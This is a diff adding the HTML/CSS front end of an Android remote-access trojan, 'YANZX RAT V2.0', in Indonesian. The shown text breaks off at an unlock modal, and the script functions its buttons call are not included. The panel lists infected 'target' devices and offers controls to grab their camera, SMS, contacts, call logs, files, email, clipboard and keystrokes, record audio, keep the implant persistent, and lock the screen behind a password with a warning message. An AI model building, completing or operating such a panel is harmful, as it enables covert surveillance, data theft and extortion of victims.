@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>YANZX RAT - Premium Control Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: 'Inter', 'Poppins', sans-serif;
+            background: radial-gradient(ellipse at 20% 30%, #0a0a0f, #050508);
+            color: white;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(16,163,127,0.08) 0%, transparent 70%);
+            pointer-events: none; z-index: 0;
+        }
+
+        /* DRAWER */
+        .drawer {
+            position: fixed; top: 0; left: -300px; width: 280px; height: 100%;
+            background: rgba(15,15,26,0.95); backdrop-filter: blur(20px);
+            z-index: 1000; transition: 0.4s; box-shadow: 4px 0 30px rgba(0,0,0,0.5);
+            border-right: 1px solid rgba(16,163,127,0.2);
+        }
+        .drawer.open { left: 0; }
+        .drawer-header { padding: 35px 25px; border-bottom: 1px solid rgba(16,163,127,0.3); margin-bottom: 20px; background: linear-gradient(135deg, rgba(16,163,127,0.1), transparent); }
+        .drawer-header h2 { color: #10a37f; font-size: 24px; letter-spacing: 2px; }
+        .drawer-header p { color: #888; font-size: 11px; margin-top: 5px; }
+        .drawer-menu { padding: 0 15px; }
+        .drawer-item { padding: 14px 18px; margin: 5px 0; border-radius: 14px; display: flex; align-items: center; gap: 14px; cursor: pointer; color: #ccc; transition: 0.3s; font-weight: 500; }
+        .drawer-item:hover { background: linear-gradient(90deg, rgba(16,163,127,0.15), transparent); color: #10a37f; transform: translateX(5px); }
+        .drawer-footer { position: absolute; bottom: 30px; left: 0; right: 0; padding: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
+
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 999; display: none; }
+        .overlay.show { display: block; }
+
+        /* HEADER */
+        .header { background: rgba(15,15,26,0.8); backdrop-filter: blur(12px); padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(16,163,127,0.2); position: sticky; top: 0; z-index: 100; }
+        .menu-icon { font-size: 26px; cursor: pointer; background: linear-gradient(135deg, #10a37f, #0d8a6b); width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; border-radius: 16px; box-shadow: 0 4px 15px rgba(16,163,127,0.3); }
+        .menu-icon:active { transform: scale(0.95); }
+        .logo { font-size: 22px; font-weight: 700; letter-spacing: 2px; background: linear-gradient(135deg, #fff, #10a37f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        /* STATS */
+        .stats-container { display: flex; gap: 14px; padding: 20px; overflow-x: auto; }
+        .stat-card { background: rgba(26,26,46,0.7); backdrop-filter: blur(10px); border-radius: 24px; padding: 18px 28px; min-width: 110px; text-align: center; border: 1px solid rgba(16,163,127,0.2); transition: 0.3s; }
+        .stat-card:hover { border-color: #10a37f; transform: translateY(-3px); }
+        .stat-number { font-size: 32px; font-weight: 800; background: linear-gradient(135deg, #10a37f, #1a7f64); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stat-label { font-size: 12px; color: #888; margin-top: 6px; letter-spacing: 1px; }
+
+        /* DEVICE CARD */
+        .device-list { padding: 0 20px; }
+        .device-card { background: rgba(21,21,32,0.8); backdrop-filter: blur(8px); border-radius: 24px; padding: 18px; margin-bottom: 14px; border: 1px solid rgba(255,255,255,0.05); cursor: pointer; transition: 0.3s; }
+        .device-card.online { border-left: 4px solid #10a37f; }
+        .device-card.offline { border-left: 4px solid #dc2626; opacity: 0.7; }
+        .device-card:hover { transform: translateX(5px); border-color: rgba(16,163,127,0.5); }
+        .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .device-name { font-weight: 700; font-size: 16px; }
+        .device-status { font-size: 11px; padding: 4px 12px; border-radius: 30px; background: rgba(16,163,127,0.15); color: #10a37f; font-weight: 600; }
+        .device-status.offline { background: rgba(220,38,38,0.15); color: #ff6b6b; }
+        .device-info { font-size: 12px; color: #888; margin-bottom: 6px; }
+
+        /* CONTROL PANEL UTAMA */
+        .control-panel {
+            position: fixed; bottom: 80px; right: 20px; left: 20px;
+            background: rgba(26,26,46,0.95); backdrop-filter: blur(20px);
+            border-radius: 32px; padding: 20px; z-index: 200;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid rgba(16,163,127,0.3);
+            transition: 0.4s; transform: translateY(0); max-height: 65vh; overflow-y: auto;
+        }
+        .control-panel.hide { transform: translateY(150%); }
+        .control-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid rgba(16,163,127,0.2); }
+        .control-title { font-weight: 700; font-size: 16px; background: linear-gradient(135deg, #fff, #10a37f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .control-close { font-size: 20px; cursor: pointer; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 12px; background: rgba(255,255,255,0.1); }
+        .control-close:active { transform: scale(0.9); background: #dc2626; }
+        .control-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; }
+        .control-btn {
+            background: rgba(15,15,26,0.8); border: 1px solid rgba(255,255,255,0.05);
+            padding: 14px 8px; border-radius: 20px; display: flex; flex-direction: column;
+            align-items: center; gap: 8px; cursor: pointer; color: white; transition: 0.2s;
+        }
+        .control-btn:active { transform: scale(0.96); background: #10a37f; border-color: #10a37f; }
+        .control-btn span:first-child { font-size: 24px; }
+        .control-btn span:last-child { font-size: 11px; color: #aaa; font-weight: 500; }
+
+        /* FLOATING PANELS */
+        .floating-panel {
+            position: fixed; bottom: 80px; right: 20px; left: 20px;
+            background: rgba(26,26,46,0.95); backdrop-filter: blur(20px);
+            border-radius: 32px; padding: 24px; z-index: 250;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #10a37f;
+            transition: 0.4s; transform: translateY(0); max-height: 70vh; overflow-y: auto;
+        }
+        .floating-panel.hide { transform: translateY(150%); }
+        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid rgba(16,163,127,0.2); position: sticky; top: 0; background: #1a1a2e; }
+        .panel-title { font-size: 18px; font-weight: 700; color: #10a37f; }
+        .panel-close { font-size: 20px; cursor: pointer; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 12px; background: rgba(255,255,255,0.1); }
+        .panel-content { margin-top: 10px; }
+        .list-item {
+            background: #0f0f1a; border-radius: 16px; padding: 12px 15px;
+            margin-bottom: 10px; border-left: 3px solid #10a37f;
+        }
+        .list-title { font-size: 14px; font-weight: bold; color: #10a37f; margin-bottom: 5px; }
+        .list-detail { font-size: 12px; color: #aaa; word-break: break-all; }
+        .loading-text { text-align: center; padding: 30px; color: #888; }
+        .refresh-btn { width: 100%; padding: 14px; border-radius: 28px; border: none; background: #10a37f; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }
+
+        /* KEYLOGGER PANEL */
+        .keylog-content {
+            background: #0a0a0f;
+            border-radius: 20px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #10a37f;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .keylog-stats {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #0f0f1a;
+            border-radius: 16px;
+        }
+        .keylog-stat {
+            flex: 1;
+            text-align: center;
+        }
+        .keylog-stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #10a37f;
+        }
+        .keylog-stat-label {
+            font-size: 10px;
+            color: #888;
+        }
+        .keylog-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .keylog-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 28px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .keylog-btn-start { background: #10a37f; color: white; }
+        .keylog-btn-stop { background: #dc2626; color: white; }
+        .keylog-btn-clear { background: #333; color: white; }
+        .keylog-timestamp { font-size: 10px; color: #666; margin-top: 5px; }
+
+        /* MODAL GENERATE KODE (TANPA PERANGKAT) */
+        .kode-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); backdrop-filter: blur(8px);
+            z-index: 3000; display: flex; align-items: center; justify-content: center;
+            display: none;
+        }
+        .kode-modal.show { display: flex; }
+        .kode-modal-content {
+            background: linear-gradient(135deg, #1a1a2e 0%, #0f0f1a 100%);
+            border-radius: 48px; padding: 35px 25px; width: 85%; max-width: 350px;
+            text-align: center; border: 2px solid #10a37f;
+            animation: fadeInUp 0.3s ease;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .kode-icon { font-size: 60px; margin-bottom: 15px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .kode-title { color: white; font-size: 24px; margin-bottom: 10px; }
+        .kode-subtitle { color: #888; font-size: 12px; margin-bottom: 5px; }
+        .kode-display {
+            background: #0a0a0f; padding: 20px; border-radius: 24px;
+            margin: 15px 0; border: 1px solid #10a37f;
+        }
+        .kode-digits {
+            font-size: 28px; letter-spacing: 8px; font-family: monospace;
+            color: #10a37f; font-weight: bold;
+        }
+        .kode-buttons { display: flex; gap: 12px; margin-top: 20px; }
+        .kode-btn {
+            flex: 1; padding: 14px; border-radius: 28px; border: none;
+            font-weight: bold; cursor: pointer;
+        }
+        .kode-btn-copy { background: #10a37f; color: white; }
+        .kode-btn-generate { background: #333; color: white; }
+        .kode-btn-close { background: #dc2626; color: white; }
+        .kode-warning {
+            background: rgba(220,38,38,0.2); padding: 10px; border-radius: 16px;
+            margin-top: 15px; font-size: 11px; color: #ff8888;
+        }
+
+        /* BOTTOM NAV */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: rgba(15,15,26,0.9); backdrop-filter: blur(12px);
+            display: flex; justify-content: space-around; padding: 12px 20px 24px;
+            border-top: 1px solid rgba(16,163,127,0.2); z-index: 100;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; color: #666; transition: 0.3s; padding: 8px 16px; border-radius: 24px; }
+        .nav-item.active { color: #10a37f; background: rgba(16,163,127,0.1); }
+        .nav-item span:first-child { font-size: 24px; }
+        .nav-item span:last-child { font-size: 11px; font-weight: 600; }
+
+        .page { display: none; padding-bottom: 100px; }
+        .page.active { display: block; }
+
+        .profile-card { background: rgba(21,21,32,0.8); backdrop-filter: blur(10px); margin: 20px; padding: 24px; border-radius: 28px; text-align: center; }
+        .profile-avatar { width: 80px; height: 80px; background: #10a37f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 15px; }
+        .logout-btn { background: #dc2626; border: none; padding: 14px; border-radius: 28px; color: white; font-weight: bold; width: 100%; margin-top: 20px; cursor: pointer; }
+
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(8px); z-index: 2000; display: flex; align-items: center; justify-content: center; display: none; }
+        .modal.show { display: flex; }
+        .modal-content { background: rgba(26,26,46,0.95); backdrop-filter: blur(20px); margin: 20px; padding: 28px; border-radius: 36px; width: 100%; max-width: 320px; border: 1px solid #10a37f; }
+        .loading { text-align: center; padding: 40px; color: #888; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #1a1a2e; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #10a37f; border-radius: 10px; }
+        
+         /* WEBVIEW UNTUK DASHBOARD */
+        .webview-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            background: #0a0a0f;
+            display: none;
+        }
+
+        .webview-container.show {
+            display: block;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- DRAWER -->
+<div class="drawer" id="drawer">
+    <div class="drawer-header"><h2>YANZXRAT V2.0</h2><p>Remote Akses Trojan</p></div>
+    <div class="drawer-menu">
+        <div class="drawer-item" onclick="navigateTo('dashboard')">📊 Dashboard</div>
+        <div class="drawer-item" onclick="navigateTo('devices')">📱 Perangkat</div>
+        <div class="drawer-item" onclick="navigateTo('account')">👤 Profil</div>
+        <div class="drawer-item" onclick="openBuatKodeBaru()">✨ Buat Kode Baru</div>
+    </div>
+    <div class="drawer-footer">
+        <div class="drawer-item" onclick="hubungiDeveloper()">📞 Hubungi Developer</div>
+         <div class="drawer-item" onclick="logout()" style="color:#ff6b6b;">🚪 Logout</div>
+</div>
+    </div>
+</div>
+<div class="overlay" id="overlay" onclick="closeDrawer()"></div>
+
+<!-- WEBVIEW DASHBOARD -->
+    <div class="webview-container" id="webviewContainer">
+        <iframe id="dashboardFrame" src="about:blank"></iframe>
+    </div>
+
+<!-- HEADER -->
+<div class="header">
+    <div class="menu-icon" onclick="toggleDrawer()">☰</div>
+    <div class="logo">YANZ<span>XRAT</span></div>
+    <div style="width:48px;"></div>
+</div>
+
+<!-- PAGES -->
+<div id="dashboardPage" class="page active">
+    <div class="stats-container" id="statsContainer">
+        <div class="stat-card"><div class="stat-number" id="totalDevices">0</div><div class="stat-label">SEMUA</div></div>
+        <div class="stat-card"><div class="stat-number" id="onlineDevices">0</div><div class="stat-label">ONLINE</div></div>
+        <div class="stat-card"><div class="stat-number" id="offlineDevices">0</div><div class="stat-label">OFFLINE</div></div>
+        <div class="stat-card"><div class="stat-number" id="favDevices">0</div><div class="stat-label">FAVORIT</div></div>
+    </div>
+    <div class="device-list" id="deviceList"><div class="loading">Loading devices...</div></div>
+</div>
+
+<div id="devicesPage" class="page">
+    <div class="device-list" id="devicesPageList"><div class="loading">Loading...</div></div>
+</div>
+
+<div id="accountPage" class="page">
+    <div class="profile-card">
+        <div class="profile-avatar">👤</div>
+        <h3 id="adminEmail">YANZX RAT User</h3>
+        <p style="color:#888; font-size:12px;">Mode: Development</p>
+        <button class="logout-btn" onclick="refreshData()">🔄 Refresh Data</button>
+    </div>
+</div>
+
+<!-- FLOATING CONTROL PANEL UTAMA -->
+<div class="control-panel hide" id="controlPanel">
+    <div class="control-header">
+        <div class="control-title" id="selectedDeviceName">Pilih perangkat</div>
+        <div class="control-close" onclick="closeControlPanel()">✕</div>
+    </div>
+    <div class="control-grid">
+        <div class="control-btn" onclick="openCameraPanel()"><span>📷</span><span>Kamera</span></div>
+        <div class="control-btn" onclick="openContactsPanel()"><span>📇</span><span>Kontak</span></div>
+        <div class="control-btn" onclick="openSmsPanel()"><span>📨</span><span>SMS</span></div>
+        <div class="control-btn" onclick="openCallLogsPanel()"><span>📞</span><span>Panggilan</span></div>
+        <div class="control-btn" onclick="openFilePanel()"><span>🗂️</span><span>File</span></div>
+        <div class="control-btn" onclick="openAppsPanel()"><span>📱</span><span>Aplikasi</span></div>
+        <div class="control-btn" onclick="openLocationPanel()"><span>📍</span><span>Lokasi</span></div>
+        <div class="control-btn" onclick="openEmailPanel()"><span>📧</span><span>Email</span></div>
+        <div class="control-btn" onclick="openKeyloggerPanel()"><span>⌨️</span><span>Keylogger</span></div>
+        <div class="control-btn" onclick="openPlaysoundPanel()"><span>🔊</span><span>Play Sound</span></div>
+        <div class="control-btn" onclick="openOpenappPanel()"><span>🚀</span><span>Open App</span></div>
+        
+        <div class="control-btn" onclick="sendCommand('start_mic')"><span>🎤</span><span>Rekam Suara</span></div>
+        <div class="control-btn" onclick="sendCommand('stop_mic')"><span>⏹️</span><span>Stop Rekam</span></div>
+        <div class="control-btn" onclick="sendCommand('get_clip')"><span>📋</span><span>Clipboard</span></div>
+        <div class="control-btn" onclick="openLockSettings()"><span>🔒</span><span>Lock Settings</span></div>
+        <div class="control-btn" onclick="openUnlockDialog()"><span>🔓</span><span>Unlock</span></div>
+        <div class="control-btn" onclick="openWallpaperPanel()"><span>🖼️</span><span>Wallpaper</span></div>
+        <div class="control-btn" onclick="openOpenurlPanel()"><span>🌐</span><span>Buka URL</span></div>
+        <div class="control-btn" onclick="openToastPanel()"><span>💬</span><span>Toast</span></div>
+        <div class="control-btn" onclick="sendCommand('vibe')"><span>📳</span><span>Vibrate</span></div>
+        <div class="control-btn" onclick="sendCommand('vibe_long')"><span>📳📳</span><span>Vibe Panjang</span></div>
+        <div class="control-btn" onclick="sendCommand('flash')"><span>🔦</span><span>Flash</span></div>
+        <div class="control-btn" onclick="sendCommand('flash_blink')"><span>💡💡</span><span>Flash Blink</span></div>
+        <div class="control-btn" onclick="sendCommand('mute')"><span>🔇</span><span>Mute</span></div>
+        <div class="control-btn" onclick="sendCommand('unmute')"><span>🔊</span><span>Unmute</span></div>
+        <div class="control-btn" onclick="sendCommand('max_vol')"><span>🔊🔊</span><span>Max Vol</span></div>
+        <div class="control-btn" onclick="sendCommand('min_vol')"><span>🔈</span><span>Min Vol</span></div>
+        <div class="control-btn" onclick="sendCommand('screenshot')"><span>📸</span><span>Screenshot</span></div>
+        <div class="control-btn" onclick="sendCommand('battery_info')"><span>🔋</span><span>Baterai</span></div>
+        <div class="control-btn" onclick="sendCommand('reboot_device')"><span>🔄</span><span>Reboot</span></div>
+        <div class="control-btn" onclick="downloadFilePrompt()"><span>📥</span><span>Download File</span></div>
+        <div class="control-btn" onclick="sendCommand('start_notif_listener')"><span>🔔</span><span>Notif Settings</span></div>
+        <div class="control-btn" onclick="sendCommand('persistent_on')"><span>🔄</span><span>Persistent ON</span></div>
+        <div class="control-btn" onclick="sendCommand('persistent_off')"><span>⛔</span><span>Persistent OFF</span></div>
+    </div>
+</div>
+
+<!-- FLOATING PANELS (sama seperti sebelumnya, tidak diubah) -->
+<div class="floating-panel hide" id="cameraPanel">
+    <div class="panel-header"><div class="panel-title">📷 KAMERA DEVICE</div><div class="panel-close" onclick="closeCameraPanel()">✕</div></div>
+    <div class="camera-preview" id="cameraPreview" style="background:#0f0f1a; border-radius:20px; padding:20px; text-align:center; margin-bottom:20px; min-height:200px;"><div class="loading-text">📷 Klik tombol untuk mengambil foto</div></div>
+    <div style="display:flex; gap:15px;">
+        <button class="refresh-btn" style="background:#10a37f;" onclick="takePhoto('front')">📸 KAMERA DEPAN</button>
+        <button class="refresh-btn" style="background:#0f0f1a; border:1px solid #10a37f;" onclick="takePhoto('back')">📷 KAMERA BELAKANG</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="wallpaperPanel">
+    <div class="panel-header">
+        <div class="panel-title">🖼️ SET WALLPAPER</div>
+        <div class="panel-close" onclick="closeWallpaperPanel()">✕</div>
+    </div>
+    <div class="panel-content">
+        <input type="text" id="wallpaperUrl" placeholder="Masukkan URL gambar..." style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white; margin-bottom:15px;">
+        <button class="refresh-btn" onclick="submitWallpaper()">SET WALLPAPER</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="openappPanel">
+    <div class="panel-header">
+        <div class="panel-title">🚀 OPEN APP</div>
+        <div class="panel-close" onclick="closeOpenappPanel()">✕</div>
+    </div>
+    <div class="panel-content">
+        <input type="text" id="openappPackage" placeholder="Package name (contoh: com.whatsapp)" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white; margin-bottom:15px;">
+        <button class="refresh-btn" onclick="submitOpenApp()">OPEN APP</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="toastPanel">
+    <div class="panel-header">
+        <div class="panel-title">💬 TOAST MESSAGE</div>
+        <div class="panel-close" onclick="closeToastPanel()">✕</div>
+    </div>
+    <div class="panel-content">
+        <input type="text" id="toastMessage" placeholder="Masukkan pesan toast..." style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white; margin-bottom:15px;">
+        <button class="refresh-btn" onclick="submitToast()">SEND TOAST</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="playsoundPanel">
+    <div class="panel-header">
+        <div class="panel-title">🔊 PLAY SOUND</div>
+        <div class="panel-close" onclick="closePlaysoundPanel()">✕</div>
+    </div>
+    <div class="panel-content">
+        <input type="text" id="soundUrl" placeholder="URL MP3 (contoh: https://example.com/sound.mp3)" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white; margin-bottom:15px;">
+        <button class="refresh-btn" onclick="submitPlaySound()">PLAY SOUND</button>
+    </div>
+</div>
+
+<!-- FLOATING PANEL INPUT BUKA URL -->
+<div class="floating-panel hide" id="openurlPanel">
+    <div class="panel-header">
+        <div class="panel-title">🌐 BUKA URL</div>
+        <div class="panel-close" onclick="closeOpenurlPanel()">✕</div>
+    </div>
+    <div class="panel-content">
+        <input type="text" id="openurlLink" placeholder="Masukkan URL (contoh: https://google.com)" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white; margin-bottom:15px;">
+        <button class="refresh-btn" onclick="submitOpenUrl()">BUKA URL</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="contactsPanel">
+    <div class="panel-header"><div class="panel-title">📇 KONTAK TARGET</div><div class="panel-close" onclick="closeContactsPanel()">✕</div></div>
+    <div class="panel-content" id="contactsContent"><div class="loading-text">⏳ Mengambil kontak...</div></div>
+    <button class="refresh-btn" onclick="refreshContacts()">🔄 Refresh Kontak</button>
+</div>
+
+<div class="floating-panel hide" id="smsPanel">
+    <div class="panel-header"><div class="panel-title">📨 SMS TARGET</div><div class="panel-close" onclick="closeSmsPanel()">✕</div></div>
+    <div class="panel-content" id="smsContent"><div class="loading-text">⏳ Mengambil SMS...</div></div>
+    <button class="refresh-btn" onclick="refreshSms()">🔄 Refresh SMS</button>
+</div>
+
+<div class="floating-panel hide" id="callLogsPanel">
+    <div class="panel-header"><div class="panel-title">📞 PANGGILAN TARGET</div><div class="panel-close" onclick="closeCallLogsPanel()">✕</div></div>
+    <div class="panel-content" id="callLogsContent"><div class="loading-text">⏳ Mengambil riwayat panggilan...</div></div>
+    <button class="refresh-btn" onclick="refreshCallLogs()">🔄 Refresh Panggilan</button>
+</div>
+
+<div class="floating-panel hide" id="filePanel">
+    <div class="panel-header"><div class="panel-title">🗂️ FILE EXPLORER</div><div class="panel-close" onclick="closeFilePanel()">✕</div></div>
+    <div class="panel-content" id="fileContent"><div class="loading-text">⏳ Mengambil daftar file...</div></div>
+    <div style="display:flex; gap:10px; margin-top:15px;">
+        <input type="text" id="filePathInput" placeholder="Path folder (contoh: /sdcard/)" style="flex:1; background:#0f0f1a; border:1px solid #333; border-radius:28px; padding:12px; color:white;">
+        <button class="refresh-btn" style="width:auto; padding:12px 20px;" onclick="browseFile()">📂 Buka</button>
+    </div>
+</div>
+
+<div class="floating-panel hide" id="appsPanel">
+    <div class="panel-header"><div class="panel-title">📱 APLIKASI TERINSTAL</div><div class="panel-close" onclick="closeAppsPanel()">✕</div></div>
+    <div class="panel-content" id="appsContent"><div class="loading-text">⏳ Mengambil daftar aplikasi...</div></div>
+    <button class="refresh-btn" onclick="refreshApps()">🔄 Refresh Aplikasi</button>
+</div>
+
+<div class="floating-panel hide" id="locationPanel">
+    <div class="panel-header"><div class="panel-title">🌐 LOKASI VIA IP</div><div class="panel-close" onclick="closeLocationPanel()">✕</div></div>
+    <div class="map-container" style="width:100%; height:300px; border-radius:20px; overflow:hidden; margin-bottom:15px;"><iframe id="mapFrame" src="about:blank" style="width:100%; height:100%; border:none;"></iframe></div>
+    <div class="location-address" id="locationAddress" style="background:#0f0f1a; padding:12px; border-radius:16px; font-size:12px; color:#aaa; margin-bottom:15px;">Mengambil lokasi via IP...</div>
+    <div class="location-coord" id="locationCoord" style="font-size:11px; color:#10a37f; text-align:center; margin-bottom:15px;">-</div>
+    <button class="refresh-btn" onclick="refreshLocation()">🔄 Refresh Lokasi</button>
+</div>
+
+<div class="floating-panel hide" id="emailPanel">
+    <div class="panel-header"><div class="panel-title">📧 EMAIL / GMAIL TARGET</div><div class="panel-close" onclick="closeEmailPanel()">✕</div></div>
+    <div class="panel-content" id="emailContent"><div class="loading-text">Klik tombol refresh untuk mengambil data email</div></div>
+    <button class="refresh-btn" onclick="refreshEmails()">🔄 Refresh Email</button>
+    <button class="refresh-btn" style="background:#333; margin-top:10px;" onclick="getEmailApps()">📱 Cek Aplikasi Email</button>
+</div>
+
+<div class="floating-panel hide" id="keyloggerPanel">
+    <div class="panel-header">
+        <div class="panel-title">⌨️ KEYLOGGER REAL-TIME</div>
+        <div class="panel-close" onclick="closeKeyloggerPanel()">✕</div>
+    </div>
+    <div class="keylog-stats">
+        <div class="keylog-stat"><div class="keylog-stat-value" id="keylogCharCount">0</div><div class="keylog-stat-label">Karakter</div></div>
+        <div class="keylog-stat"><div class="keylog-stat-value" id="keylogEntryCount">0</div><div class="keylog-stat-label">Percobaan</div></div>
+        <div class="keylog-stat"><div class="keylog-stat-value" id="keylogStatus">⏹️</div><div class="keylog-stat-label">Status</div></div>
+    </div>
+    <div class="keylog-content" id="keylogContent"><div class="loading-text">Klik Start Keylogger untuk memulai</div></div>
+    <div class="keylog-buttons">
+        <button class="keylog-btn keylog-btn-start" onclick="startKeylogger()">▶️ START</button>
+        <button class="keylog-btn keylog-btn-stop" onclick="stopKeylogger()">⏹️ STOP</button>
+        <button class="keylog-btn keylog-btn-clear" onclick="clearKeylogDisplay()">🗑️ CLEAR</button>
+    </div>
+    <button class="refresh-btn" style="margin-top:10px;" onclick="refreshKeylog()">🔄 Refresh Data</button>
+</div>
+
+<div class="floating-panel hide" id="lockSettingsPanel">
+    <div class="panel-header"><div class="panel-title">🔒 LOCK SETTINGS</div><div class="panel-close" onclick="closeLockSettings()">✕</div></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">🔐 SET PASSWORD LOCK</label><input type="password" id="lockPassword" placeholder="Password baru (min 4 digit)" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"><button class="refresh-btn" style="margin-top:10px;" onclick="setLockPassword()">SET PASSWORD</button></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">📝 TITLE</label><input type="text" id="lockTitle" placeholder="🔒 DEVICE LOCKED" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">📄 SUBTITLE</label><input type="text" id="lockSubtitle" placeholder="This device has been locked" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">💬 CUSTOM MESSAGE</label><textarea id="lockCustomMessage" rows="2" placeholder="Pesan khusus..." style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></textarea></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">🔘 BUTTON TEXT</label><input type="text" id="lockButtonText" placeholder="🔓 UNLOCK" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">⚠️ WARNING TEXT</label><input type="text" id="lockWarning" placeholder="⚠️ DO NOT FORCE CLOSE" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></div>
+    <div class="row-2" style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:15px;">
+        <div><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">🎨 BACKGROUND</label><input type="color" id="lockBgColor" value="#0a0a0a" style="width:100%; height:40px; border-radius:16px;"></div>
+        <div><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">🎨 AKSEN</label><input type="color" id="lockAccentColor" value="#ff3333" style="width:100%; height:40px; border-radius:16px;"></div>
+    </div>
+    <div class="lock-settings-group" style="margin-bottom:15px;"><label style="display:block; font-size:12px; color:#888; margin-bottom:8px;">🔑 ICON LOCK</label><input type="text" id="lockIcon" placeholder="🔒" style="width:100%; padding:12px; border-radius:16px; border:1px solid #333; background:#0f0f1a; color:white;"></div>
+    <button class="refresh-btn" onclick="applyLockSettings()">✅ APPLY SETTINGS</button>
+    <button class="refresh-btn" style="background:#dc2626; margin-top:10px;" onclick="sendLockNow()">🔒 LOCK DEVICE NOW</button>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+    <div class="nav-item active" onclick="switchPage('dashboard')"><span>🏠</span><span>BERANDA</span></div>
+    <div class="nav-item" onclick="switchPage('devices')"><span>🎮</span><span>KONTROL</span></div>
+    <div class="nav-item" onclick="openLockSettingsFromNav()"><span>🔒</span><span>LOCK</span></div>
+    <div class="nav-item" onclick="switchPage('account')"><span>👤</span><span>PROFIL</span></div>
+</div>
+
+<!-- MODAL UNLOCK -->
+<div class="modal" id="unlockModal">
